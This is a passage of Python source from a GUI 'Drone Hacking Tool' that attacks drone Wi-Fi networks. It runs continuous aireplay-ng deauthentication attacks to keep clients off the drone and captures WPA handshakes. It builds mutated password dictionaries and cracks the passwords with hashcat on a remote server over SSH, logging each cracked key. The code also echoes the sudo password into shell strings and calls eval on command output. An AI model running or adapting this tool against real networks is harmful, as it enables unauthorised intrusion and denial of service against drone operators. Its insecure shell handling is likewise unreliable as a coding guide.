                check_wifi_connect_states = "nmcli d show " + selected_interface + " 2>&1 | grep 'GENERAL.STATE:' | awk '{print $3}'"
                get_wifi_connect_states = subprocess.Popen(check_wifi_connect_states, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout #Get Wi-Fi connection state
                wifi_connect_states = get_wifi_connect_states.read().splitlines()
                wifi_connect_state_convert = str(wifi_connect_states) #Convert to string
                wifi_connect_states_strip = wifi_connect_state_convert.strip("[]") #Remove characters "[]"
                wifi_connect_states_strip_bracket = eval(wifi_connect_states_strip) #Remove characters "''"
                return_wifi_connect_states = wifi_connect_states_strip_bracket.strip("()") #Remove characters "()"
                disconect_wifi = "nmcli dev disconnect " + selected_interface
                if return_wifi_connect_states == "connected": #If Wi-Fi connected
                    disconnect_wifi = subprocess.Popen(disconect_wifi, stdout = subprocess.PIPE, shell = True)
                    disconnect_wifi.wait()
                elif return_wifi_connect_states == "connecting": #If connecting a Wi-Fi network
                    disconnect_wifi = subprocess.Popen(disconect_wifi, stdout = subprocess.PIPE, shell = True)
                    disconnect_wifi.wait()
                interface_down = "echo " + sudo_password + " | sudo -S ifconfig " + selected_interface + " down"
                interface_mode_monitor = "echo " + sudo_password + " | sudo -S iwconfig " + selected_interface + " mode monitor"
                interface_up = "echo " + sudo_password + " | sudo -S ifconfig " + selected_interface + " up"
                interface_down_states = subprocess.Popen(interface_down, stdout = subprocess.PIPE, shell = True)
                interface_down_states.wait()
                interface_mode_monitor_states = subprocess.Popen(interface_mode_monitor, stdout = subprocess.PIPE, shell = True)
                interface_mode_monitor_states.wait()
                interface_up_states = subprocess.Popen(interface_up, stdout = subprocess.PIPE, shell = True)
                interface_up_states.wait()
                get_messagebox_states = messagebox.askyesnocancel("Wrong Wi-Fi password", "'Yes' to enter new password,\n'No' to collect 4-way handshake?\n'Cancel' for other actions.")
                if get_messagebox_states == True:
                    self.load_attack()
                    app.after(2000, self.check_askstring)
                elif get_messagebox_states == False:
                    self.progressbar.start()
                    self.encrypted_wifi_network()
                elif get_messagebox_states == None:
                    if messagebox.askyesno("Request Processed", "Would you like to keep running deauthentication attack to prevent the client reconnect to the drone?"):
                        deauth_info = "echo " + sudo_password + " | sudo -S xterm -iconic -T 'deauthinfo' -hold -e 'aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'"
                        subprocess.Popen(deauth_info, stdout = subprocess.PIPE, shell = True)
                        if messagebox.showinfo("Wi-Fi Deauthentication", "Please press 'OK' to stop Wi-Fi Deauthentication attack."):
                            find_xterm_aireplay_pid = "ps ax | grep 'xterm -iconic -T deauthinfo -hold -e aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'" + " | grep -v grep | grep -v sudo | awk '{print $1}'"
                            get_xterm_aireplay_pid = subprocess.Popen(find_xterm_aireplay_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
                            xterm_aireplay_pid = get_xterm_aireplay_pid.read().splitlines()
                            xterm_aireplay_pid_convert = str(xterm_aireplay_pid) #Convert to string
                            xterm_aireplay_pid_strip = xterm_aireplay_pid_convert.strip("[]") #Remove characters "[]"
                            return_xterm_aireplay_pid = eval(xterm_aireplay_pid_strip) #Remove characters "''"
                            colse_xterm_aireplay = "echo " + sudo_password + " | sudo -S kill " + return_xterm_aireplay_pid
                            close_xterm_aireplay_terminal = subprocess.Popen(colse_xterm_aireplay, stdout = subprocess.PIPE, shell = True) #For close the xterm aireplay terminal
                            close_xterm_aireplay_terminal.wait()
                            time.sleep(0.3)
                            self.destroy_wifi_attack_gui()
                            self.controller.show_frame("StartPage")
                    else:
                        self.destroy_wifi_attack_gui()
                        self.controller.show_frame("StartPage")
        else:
            self.progressbar.stop()
            self.info_label.config(text = "BSSID not found.")
            if selected_privacy == "OPN":
                try:
                    self.step3_label.config(text = "Connect your selected target                      ", image = self.label_fail_icon, compound = "right")
                except:
                    self.step3_label.config(text = "Connect your selected target                      ☒")
            else:
                try:
                    self.step4_label.config(text = "Connect your selected target                      ", image = self.label_fail_icon, compound = "right")
                except:
                    self.step4_label.config(text = "Connect your selected target                      ☒")
            if messagebox.askretrycancel("Error", "BSSID not found.\n\nPress 'Retry' to try again or 'Cancel' to rescan Access Point."):
                if selected_privacy == "OPN":
                    try:
                        self.step3_label.config(text = "Connect your selected target                      ", image = self.label_loading_icon, compound = "right")
                    except:
                        self.step3_label.config(text = "Connect your selected target                      ☐")
                else:
                    try:
                        self.step4_label.config(text = "Connect your selected target                      ", image = self.label_loading_icon, compound = "right")
                    except:
                        self.step4_label.config(text = "Connect your selected target                      ☐")
                connect_access_point_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
                self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
                if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                    target_BSSID_log = [selected_bssid]
                    channel_log = [selected_channel]
                    privacy_log = [selected_privacy]
                    password_log = [user_provide_password]
                    manufacturer_log = [matched_manufacturer]
                    client_BSSID_log = [selected_ap_client]
                    connect_timestamp_log = [connect_access_point_timestamp]
                    states_log = ["Failed to connect, BSSID: " + selected_bssid + "is not found"]
                    dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log, "timestamp":connect_timestamp_log, "states":states_log})
                    dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ',', mode = "a", header = False) #Write log data to "drone_attack_log.csv"
                self.progressbar.start()
                self.connect_access_point()
            else:
                self.destroy_wifi_attack_gui()
                self.controller.show_frame("APDisplay")

    def restart_network_service(self):
        restart_network_service = "echo " + sudo_password + " | sudo -S service network-manager restart"
        restart_network_service_state = subprocess.Popen(restart_network_service, stdout = subprocess.PIPE, shell = True)
        restart_network_service_state.wait()
        time.sleep(3.0)
        self.progressbar.start()
        self.connect_access_point()

    def destroy_wifi_attack_gui(self): #Kill get_selected_ap_client_gui object
        self.title_label.destroy()
        self.step1_label.destroy()
        self.step2_label.destroy()
        self.step3_label.destroy()
        self.step4_label.destroy()
        self.image_label.destroy()
        self.progressbar.destroy()
        self.info_label.destroy()


class RemoteServerConnect(tk.Frame):

    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller
        self.bind("<<ShowFrame>>", self.thread_control)
        self.password_dictionary = False
        self.failed_to_find_get_four_way_handshake_convert_file = False
        self.wifi_deauthentication_states = True

    def thread_control(self, event):
        threading.Thread(target = self.remote_server_login_gui).start()

    def remote_server_login_gui(self):
        self.title_label = tk.Label(self, background = "white", text = "Remote server login:", font = self.controller.title_font)
        self.title_label.pack(side = "top", fill = "x", pady = 5)

        self.subtitle_label = tk.Label(self, background = "white", text = "Using the remote server to boost up the speed of cracking password", font = self.controller.subtitle_font)
        self.subtitle_label.pack()

        try:
            self.label_ssh_service_connect_image = tk.PhotoImage(file = current_path + "/data/gui_img/ssh_service_connect.png")

            self.ssh_service_connect_label = tk.Label(self, background = "white", image = self.label_ssh_service_connect_image, font = self.controller.label_font)
            self.ssh_service_connect_label.pack(side = "top", pady = 10)
        except:
            self.ssh_service_connect_label = tk.Label(self, background = "white", text = "", font = self.controller.label_font)
            self.ssh_service_connect_label.pack(side = "top", pady = 10)

        self.ssh_ip_label_ssh_ip_inputbox_frame = tk.Frame(self)
        self.ssh_ip_label_ssh_ip_inputbox_frame.config(background = "white")
        self.ssh_ip_label = tk.Label(self.ssh_ip_label_ssh_ip_inputbox_frame, background = "white", text = "SSH IP address:            ", font = self.controller.label_font)
        self.ssh_ip_label.pack(side = "left", anchor = "w")

        self.ssh_ip_inputbox = tk.Entry(self.ssh_ip_label_ssh_ip_inputbox_frame, background = "white", font = self.controller.label_font)
        self.ssh_ip_inputbox.pack(fill = "x")
        self.ssh_ip_label_ssh_ip_inputbox_frame.pack(side = "top", fill = "both", pady = 10)

        self.ssh_port_label_ssh_port_inputbox_frame = tk.Frame(self)
        self.ssh_port_label_ssh_port_inputbox_frame.config(background = "white")
        self.ssh_port_label = tk.Label(self.ssh_port_label_ssh_port_inputbox_frame, background = "white", text = "SSH port:                      ", font = self.controller.label_font)
        self.ssh_port_label.pack(side = "left", anchor = "w")

        self.ssh_port_inputbox = tk.Entry(self.ssh_port_label_ssh_port_inputbox_frame, background = "white", font = self.controller.label_font)
        self.ssh_port_inputbox.pack(fill = "x")
        self.ssh_port_label_ssh_port_inputbox_frame.pack(side = "top", fill = "both", pady = 10)

        self.ssh_user_name_label_ssh_user_name_inputbox_frame = tk.Frame(self)
        self.ssh_user_name_label_ssh_user_name_inputbox_frame.config(background = "white")
        self.ssh_user_name_label = tk.Label(self.ssh_user_name_label_ssh_user_name_inputbox_frame, background = "white", text = "SSH user name:           ", font = self.controller.label_font)
        self.ssh_user_name_label.pack(side = "left", anchor = "w")

        self.ssh_user_name_inputbox = tk.Entry(self.ssh_user_name_label_ssh_user_name_inputbox_frame, background = "white", font = self.controller.label_font)
        self.ssh_user_name_inputbox.pack(fill = "x")
        self.ssh_user_name_label_ssh_user_name_inputbox_frame.pack(side = "top", fill = "both", pady = 10)

        self.ssh_user_password_label_ssh_user_password_inputbox_frame = tk.Frame(self)
        self.ssh_user_password_label_ssh_user_password_inputbox_frame.config(background = "white")
        self.ssh_user_password_label = tk.Label(self.ssh_user_password_label_ssh_user_password_inputbox_frame, background = "white", text = "SSH user password:    ", font = self.controller.label_font)
        self.ssh_user_password_label.pack(side = "left", anchor = "w")

        self.ssh_user_password_inputbox = tk.Entry(self.ssh_user_password_label_ssh_user_password_inputbox_frame, background = "white", font = self.controller.label_font)
        self.ssh_user_password_inputbox.pack(fill = "x")
        self.ssh_user_password_label_ssh_user_password_inputbox_frame.pack(side = "top", fill = "both", pady = 10)

        self.footer_frame = tk.Frame(self)
        self.footer_frame.config(background = "white")
        self.progressbar = ttk.Progressbar(self.footer_frame, style="green.Horizontal.TProgressbar", orient = "horizontal", mode = "indeterminate")
        self.progressbar.pack(side = "top", fill = "x")
        
        self.info_label = tk.Label(self.footer_frame, background = "white", text = "Ready.", font = self.controller.info_font)
        self.info_label.pack(side = "left", anchor = "sw", pady = 5)

        try:
            self.start_button_icon = tk.PhotoImage(file = current_path + "/data/gui_img/start_icon.png")
            
            self.start_button = tk.Button(self.footer_frame, background = "white", text = "Start", image = self.start_button_icon, compound = "left",
                               command = lambda: self.check_user_input())
            self.start_button.pack(side = "right", anchor = "se")
        except: #If icon not found
            self.start_button = tk.Button(self.footer_frame, background = "white", text = "Start",
                               command = lambda: self.check_user_input())
            self.start_button.pack(side = "right", anchor = "se")
        self.footer_frame.pack(side = "bottom", fill = "both")

    def menubar(self, tool):
        menubar = tk.Menu(tool)
        option_tool = tk.Menu(menubar, tearoff = 0)
        option_tool.add_command(label = "Home", command = lambda: quit(), state="disable")
        option_tool.add_separator()  
        option_tool.add_command(label = "Exit", command = lambda: quit(), state="disable")
        menubar.add_cascade(label = "Option", menu = option_tool)
        help_tool = tk.Menu(menubar, tearoff = 0)
        help_tool.add_command(label = "Page guide", command = lambda: messagebox.showinfo("Page Guide",
                                    "Crack the password through the remote server to improve the effectiveness of cracking a password.\n\nTo enjoy the faster password cracking effectiveness, please type in the remote server login information."))
        help_tool.add_command(label = "About", command = lambda: messagebox.showinfo("Drone Hacking Tool",
                                    "Code name: Barbary lion\nVersion: 1.1.2.111\n\nGroup member:\nSam KAN\nMichael YUEN\nDicky SHEK"))
        menubar.add_cascade(label = "Help", menu = help_tool)
        return menubar

    def check_user_input(self):
        self.get_user_type_in_ssh_ip = self.ssh_ip_inputbox.get()
        self.get_user_type_in_ssh_port = self.ssh_port_inputbox.get()
        self.get_user_type_in_ssh_user_name = self.ssh_user_name_inputbox.get()
        self.get_user_type_in_ssh_user_password = self.ssh_user_password_inputbox.get()
        if self.get_user_type_in_ssh_ip == "" or self.get_user_type_in_ssh_port == "" or self.get_user_type_in_ssh_user_name == "" or self.get_user_type_in_ssh_user_password == "":
            messagebox.showerror("Error", "You must fill in all the fields.")
        elif self.get_user_type_in_ssh_ip != "" or self.get_user_type_in_ssh_port != "" or self.get_user_type_in_ssh_user_name != "" or self.get_user_type_in_ssh_user_password != "":
                try:
                    ipaddress.ip_address(self.get_user_type_in_ssh_ip)
                    try:
                        self.get_user_type_in_ssh_port_int = int(self.get_user_type_in_ssh_port)
                        if self.get_user_type_in_ssh_port_int < 0 or self.get_user_type_in_ssh_port_int > 65353:
                            if messagebox.showerror("Error", "Invalid port number."):
                                self.ssh_port_inputbox.delete(0, "end") #Clear inputbox string
                        else:
                            self.ssh_ip_inputbox.config(state = "disable")
                            self.ssh_port_inputbox.config(state = "disable")
                            self.ssh_user_name_inputbox.config(state = "disable")
                            self.ssh_user_password_inputbox.config(state = "disable")
                            self.progressbar.start()
                            self.info_label.config(text = "Please wait.")
                            self.start_button.config(state = "disable")
                            threading.Thread(target = self.four_way_handshake_file_validation()).start()
                    except ValueError:
                        self.progressbar.stop()
                        if messagebox.showerror("Error", "Invalid port number."):
                            self.ssh_port_inputbox.delete(0, "end") #Clear inputbox string 
                except ValueError:
                    if messagebox.showerror("Error", "Invalid IP address."):
                        self.ssh_ip_inputbox.delete(0, "end") #Clear inputbox string

    def four_way_handshake_file_validation(self):
        self.check_four_way_handshake_convert_file = Path(four_way_handshake_convert_file)
        if self.check_four_way_handshake_convert_file.is_file(): #Check "check_four_way_handshake_convert_file" is really exist
            self.four_way_handshake_file_localpath = four_way_handshake_convert_file
            self.four_way_handshake_convert_filename = self.four_way_handshake_file_localpath.replace(current_path + "/handshake/hashcat_convert_file/", '')
            self.four_way_handshake_file_remotepath = "/home/" + self.get_user_type_in_ssh_user_name + "/" + self.four_way_handshake_convert_filename
            try:
                if cracked_password_output != "":
                    self.info_label.config(text = "Waiting for user select.")
                    if messagebox.askyesno("Create password dictionary", "Would you like to create a password dictionary to improve the effective of cracking password?"):
                        self.info_label.config(text = "Generating a password dictionary file.")
                        #password_dictionary_path_timestamp = time.strftime("%Y%m%d-%H%M%S") #Create a timestamp
                        password_dictionary_path = current_path + "/handshake/password_dictionary/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "_dictionary" + ".txt"
                        changed_password_generator.passwordInsert(cracked_password_output, password_dictionary_path, True) #True is enable two insert
                        changed_password_generator.oneChange(cracked_password_output, password_dictionary_path)
                        changed_password_generator.twoChange(cracked_password_output, password_dictionary_path)
                        changed_password_generator.oneInsertoneChange(cracked_password_output, password_dictionary_path)
                        self.password_dictionary_file_localpath = password_dictionary_path
                        self.password_dictionary_file_remotepath = "/home/" + self.get_user_type_in_ssh_user_name + "/"  + selected_bssid + "_" + four_way_handshake_file_timestamp + "_dictionary" + ".txt"
                        self.password_dictionary_filename = selected_bssid + "_" + four_way_handshake_file_timestamp + "_dictionary" + ".txt"
                        self.password_dictionary = True
                        remote_server_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
                        self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
                        if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                            target_BSSID_log = [selected_bssid]
                            channel_log = [selected_channel]
                            privacy_log = [selected_privacy]
                            password_log = [cracked_wifi_password]
                            manufacturer_log = [matched_manufacturer]
                            client_BSSID_log = [selected_ap_client]
                            remote_server_timestamp_log = [remote_server_timestamp]
                            states_log = ["BSSID: " + selected_bssid + " password dictionary created. File save at:" + password_dictionary_path]
                            dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log, "timestamp":remote_server_timestamp_log, "states":states_log})
                            dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "drone_attack_log.csv"
                    else:
                        self.password_dictionary = False
                else:
                    pass
            except NameError:
                pass
            threading.Thread(target = self.ssh_connect).start()
        else: #Handshake file not found or missing
            try:
                get_four_way_handshake_convert_file = filedialog.askopenfilename(initialdir = current_path + "/handshake/hashcat_convert_file/", filetypes = [('hccapx files', '.hccapx')], title = "Select File")
                #print(get_four_way_handshake_convert_file)
                if get_four_way_handshake_convert_file == "":
                    self.progressbar.stop()
                    if messagebox.showerror("Error", "You must select one file."):
                        self.ssh_ip_inputbox.config(state = "normal")
                        self.ssh_port_inputbox.config(state = "normal")
                        self.ssh_user_name_inputbox.config(state = "normal")
                        self.ssh_user_password_inputbox.config(state = "normal")
                        self.start_button.config(state = "normal")
                else:
                    self.four_way_handshake_file_localpath = get_four_way_handshake_convert_file
                    self.four_way_handshake_convert_filename = get_four_way_handshake_convert_file.replace(current_path + "/handshake/hashcat_convert_file/", '')
                    self.four_way_handshake_file_remotepath = "/home/" + self.get_user_type_in_ssh_user_name + "/" + self.four_way_handshake_convert_filename
                    try:
                        if cracked_password_output != "":
                            self.info_label.config(text = "Waiting for user select.")
                            if messagebox.askyesno("Create password dictionary", "Would you like to create a password dictionary to improve the effective of cracking password?"):
                                self.info_label.config(text = "Generating a password dictionary file.")
                                #password_dictionary_path_timestamp = time.strftime("%Y/%m/%d-%H%M%S") #Create a timestamp
                                password_dictionary_path = current_path + "/handshake/password_dictionary/" + selected_bssid + "_" + four_way_handshake_file_timestamp + "_dictionary" + ".txt"
                                changed_password_generator.passwordInsert(cracked_password_output, password_dictionary_path, True) #True is enable two insert
                                changed_password_generator.oneChange(cracked_password_output, password_dictionary_path)
                                changed_password_generator.twoChange(cracked_password_output, password_dictionary_path)
                                changed_password_generator.oneInsertoneChange(cracked_password_output, password_dictionary_path)
                                self.password_dictionary_file_localpath = password_dictionary_path
                                self.password_dictionary_file_remotepath = "/home/" + self.get_user_type_in_ssh_user_name + "/"  + selected_bssid + "_" + four_way_handshake_file_timestamp + "_dictionary" + ".txt"
                                self.password_dictionary_filename = selected_bssid + "_" + four_way_handshake_file_timestamp + "_dictionary" + ".txt"
                                self.password_dictionary = True
                                remote_server_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
                                self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
                                if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                                    target_BSSID_log = [selected_bssid]
                                    channel_log = [selected_channel]
                                    privacy_log = [selected_privacy]
                                    password_log = [cracked_wifi_password]
                                    manufacturer_log = [matched_manufacturer]
                                    client_BSSID_log = [selected_ap_client]
                                    remote_server_timestamp_log = [remote_server_timestamp]
                                    states_log = ["BSSID: " + selected_bssid + " password dictionary created. File save at:" + password_dictionary_path]
                                    dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log, "timestamp":remote_server_timestamp_log, "states":states_log})
                                    dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "drone_attack_log.csv"
                            else:
                                self.password_dictionary = False
                        else:
                            pass
                    except NameError:
                        pass
                    threading.Thread(target = self.ssh_connect).start()
            except AttributeError:
                self.progressbar.stop()
                if messagebox.showerror("Error", "You must select one file."):
                    self.ssh_ip_inputbox.config(state = "normal")
                    self.ssh_port_inputbox.config(state = "normal")
                    self.ssh_user_name_inputbox.config(state = "normal")
                    self.ssh_user_password_inputbox.config(state = "normal")
                    self.start_button.config(state = "normal")

    def ssh_connect(self):
        if messagebox.askyesno("Wi-Fi Deauthentication", "Would you like to keep running deauthentication attack to prevent the client reconnect to the drone?"):
            deauth_info = "echo " + sudo_password + " | sudo -S xterm -iconic -T 'deauthinfo' -hold -e 'aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'"
            subprocess.Popen(deauth_info, stdout = subprocess.PIPE, shell = True)
            self.wifi_deauthentication_states = True
        try:
            self.info_label.config(text = "Connecting to the target SSH server.")
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(self.get_user_type_in_ssh_ip, self.get_user_type_in_ssh_port, self.get_user_type_in_ssh_user_name, self.get_user_type_in_ssh_user_password, timeout = 10)
            try:
                self.info_label.config(text = "Transmission file to the target SSH server.")
                sftp = client.open_sftp()
                sftp.put(self.four_way_handshake_file_localpath, self.four_way_handshake_file_remotepath)
                if self.password_dictionary == True:
                    sftp.put(self.password_dictionary_file_localpath, self.password_dictionary_file_remotepath)
                self.info_label.config(text = "Successfully uploaded.")
            except OSError:
                self.progressbar.stop()
                self.info_label.config(text = "Upload failed.")
                messagebox.showerror("Error", "Failed to transmission file to the target SSH server.")
            self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
            if self.password_dictionary == True:
                hashcat_command = "hashcat -a 0 -m 2500 " + self.four_way_handshake_convert_filename + " " + self.password_dictionary_filename + " --status --status-timer 1"
                stdin, hashcat_running_status_return_stdout, stderr = client.exec_command(hashcat_command, get_pty = True) #get_pty > get pseudo terminal
            else:
                hashcat_command = "hashcat -a 3 -m 2500 " + self.four_way_handshake_convert_filename + " --status --status-timer 1"
                stdin, hashcat_running_status_return_stdout, stderr = client.exec_command(hashcat_command, get_pty = True) #get_pty > get pseudo terminal
            self.info_label.config(text = "Cracking password.")
            for line in iter(hashcat_running_status_return_stdout.readline, ""):
                print(line, end = "")
            get_cracked_password = "hashcat -a 3 -m 2500 " + self.four_way_handshake_convert_filename + " --show" #Show crecked password
            stdin, cracked_password_return_stdout, stderr = client.exec_command(get_cracked_password , get_pty = True)
            for line in iter(cracked_password_return_stdout.readline, ""): #Print password
                separator = ":"
                get_cracked_wifi_password = separator.join(line.split(separator, 3)[-1:])
                if "\r\n" in get_cracked_wifi_password:
                    cracked_wifi_password = get_cracked_wifi_password.strip("\r\n") #Remove trailing newline
                    #print(cracked_wifi_password)
                elif "\n" in get_cracked_wifi_password:
                    cracked_wifi_password = get_cracked_wifi_password.strip("\n") #Remove trailing newline
                elif "\r" in get_cracked_wifi_password:
                    cracked_wifi_password = get_cracked_wifi_password.strip("\r") #Remove trailing newline
                else:
                    cracked_wifi_password = get_cracked_wifi_password
            client.close() #Close SSH connection
            if self.wifi_deauthentication_states == True:
                find_xterm_aireplay_pid = "ps ax | grep 'xterm -iconic -T deauthinfo -hold -e aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'" + " | grep -v grep | grep -v sudo | awk '{print $1}'"
                get_xterm_aireplay_pid = subprocess.Popen(find_xterm_aireplay_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
                xterm_aireplay_pid = get_xterm_aireplay_pid.read().splitlines()
                xterm_aireplay_pid_convert = str(xterm_aireplay_pid) #Convert to string
                xterm_aireplay_pid_strip = xterm_aireplay_pid_convert.strip("[]") #Remove characters "[]"
                return_xterm_aireplay_pid = eval(xterm_aireplay_pid_strip) #Remove characters "''"
                colse_xterm_aireplay = "echo " + sudo_password + " | sudo -S kill " + return_xterm_aireplay_pid
                close_xterm_aireplay_terminal = subprocess.Popen(colse_xterm_aireplay, stdout = subprocess.PIPE, shell = True) #For close the xterm aireplay terminal
                close_xterm_aireplay_terminal.wait()
            self.progressbar.stop()
            self.start_button.config(state = "normal")
            try:
                if cracked_wifi_password != "":
                    remote_server_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
                    self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
                    if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                        target_BSSID_log = [selected_bssid]
                        channel_log = [selected_channel]
                        privacy_log = [selected_privacy]
                        password_log = [cracked_wifi_password]
                        manufacturer_log = [matched_manufacturer]
                        client_BSSID_log = [selected_ap_client]
                        remote_server_timestamp_log = [remote_server_timestamp]
                        states_log = ["BSSID: " + selected_bssid + " password cracked. The password is: " + cracked_wifi_password]
                        dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log, "timestamp":remote_server_timestamp_log, "states":states_log})
                        dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "drone_attack_log.csv"
                    self.check_cracked_password_list_file = Path(current_path + "/data/cracked_password_list.csv")
                    if self.check_cracked_password_list_file.is_file(): #Check "cracked_password_list.csv" is really exist
                        cracked_BSSID_log = [selected_bssid]
                        password_log = [cracked_wifi_password]
                        remote_server_timestamp_log = [remote_server_timestamp]
                        dataframe = pd.DataFrame({"cracked_BSSID":cracked_BSSID_log, "password":password_log, "timestamp":remote_server_timestamp_log})
                        dataframe.to_csv(current_path + "/data/cracked_password_list.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "cracked_password_list.csv"
                        self.info_label.config(text = "Password cracked.")
                        cracked_password_message = "The password is: " + cracked_wifi_password + "\n\nWould you like to connect with your previously selected target?"
                        if messagebox.askokcancel("Successfully Cracked", cracked_password_message):
                            self.destroy_remote_server_login_gui()
                            self.controller.show_frame("WifiAttack")
                        else:
                            self.destroy_remote_server_login_gui()
                            self.controller.show_frame("StartPage")
                    else:
                        self.info_label.config(text = "Done, but failed to save the password.")
                        if messagebox.showerror("Error", "File 'cracked_password_list.csv' not found."):
                            cracked_password_message = "The password is: " + cracked_wifi_password + "\n\nWould you like to connect with your previously selected target?"
                            if messagebox.askokcancel("Successfully Cracked", cracked_password_message):
                                self.destroy_remote_server_login_gui()
                                self.controller.show_frame("WifiAttack")
                            else:
                                self.destroy_remote_server_login_gui()
                                self.controller.show_frame("StartPage")
                else:
                    remote_server_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
                    self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
                    if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                        target_BSSID_log = [selected_bssid]
                        channel_log = [selected_channel]
                        privacy_log = [selected_privacy]
                        password_log = [""]
                        manufacturer_log = [matched_manufacturer]
                        client_BSSID_log = [selected_ap_client]
                        remote_server_timestamp_log = [remote_server_timestamp]
                        states_log = ["BSSID: " + selected_bssid + " failed to crack the password"]
                        dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log, "timestamp":remote_server_timestamp_log, "states":states_log})
                        dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "drone_attack_log.csv"
                    self.info_label.config(text = "Failed to crack the password.")
                    if messagebox.askyesno("Error", "Failed to crack the password.\n\nWould you like to keep running deauthentication attack to prevent the client reconnect to the drone?"):
                        deauth_info = "echo " + sudo_password + " | sudo -S xterm -iconic -T 'deauthinfo' -hold -e 'aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'"
                        subprocess.Popen(deauth_info, stdout = subprocess.PIPE, shell = True)
                        if messagebox.showinfo("Wi-Fi Deauthentication", "Please press 'OK' to stop Wi-Fi Deauthentication attack."):
                            find_xterm_aireplay_pid = "ps ax | grep 'xterm -iconic -T deauthinfo -hold -e aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'" + " | grep -v grep | grep -v sudo | awk '{print $1}'"
                            get_xterm_aireplay_pid = subprocess.Popen(find_xterm_aireplay_pid, stdout = subprocess.PIPE, shell = True, universal_newlines = True).stdout
                            xterm_aireplay_pid = get_xterm_aireplay_pid.read().splitlines()
                            xterm_aireplay_pid_convert = str(xterm_aireplay_pid) #Convert to string
                            xterm_aireplay_pid_strip = xterm_aireplay_pid_convert.strip("[]") #Remove characters "[]"
                            return_xterm_aireplay_pid = eval(xterm_aireplay_pid_strip) #Remove characters "''"
                            colse_xterm_aireplay = "echo " + sudo_password + " | sudo -S kill " + return_xterm_aireplay_pid
                            close_xterm_aireplay_terminal = subprocess.Popen(colse_xterm_aireplay, stdout = subprocess.PIPE, shell = True) #For close the xterm aireplay terminal
                            close_xterm_aireplay_terminal.wait()
                            time.sleep(0.3)
                            self.destroy_remote_server_login_gui()
                            self.controller.show_frame("StartPage")
                    else:
                        self.destroy_remote_server_login_gui()
                        self.controller.show_frame("StartPage")
            except UnboundLocalError:
                remote_server_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
                self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
                if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                    target_BSSID_log = [selected_bssid]
                    channel_log = [selected_channel]
                    privacy_log = [selected_privacy]
                    password_log = [""]
                    manufacturer_log = [matched_manufacturer]
                    client_BSSID_log = [selected_ap_client]
                    remote_server_timestamp_log = [remote_server_timestamp]
                    states_log = ["BSSID: " + selected_bssid + " failed to crack the password"]
                    dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log, "timestamp":remote_server_timestamp_log, "states":states_log})
                    dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ",", mode = "a", header = False) #Write log data to "drone_attack_log.csv"
                self.info_label.config(text = "Failed to crack the password.")
                if messagebox.askyesno("Error", "Failed to crack the password.\n\nWould you like to keep running deauthentication attack to prevent the client reconnect to the drone?"):
                    deauth_info = "echo " + sudo_password + " | sudo -S xterm -iconic -T 'deauthinfo' -hold -e 'aireplay-ng --deauth 0 -a " + selected_bssid + " -c " + selected_ap_client + " " + selected_interface + "'"
                    subprocess.Popen(deauth_info, stdout = subprocess.PIPE, shell = True)
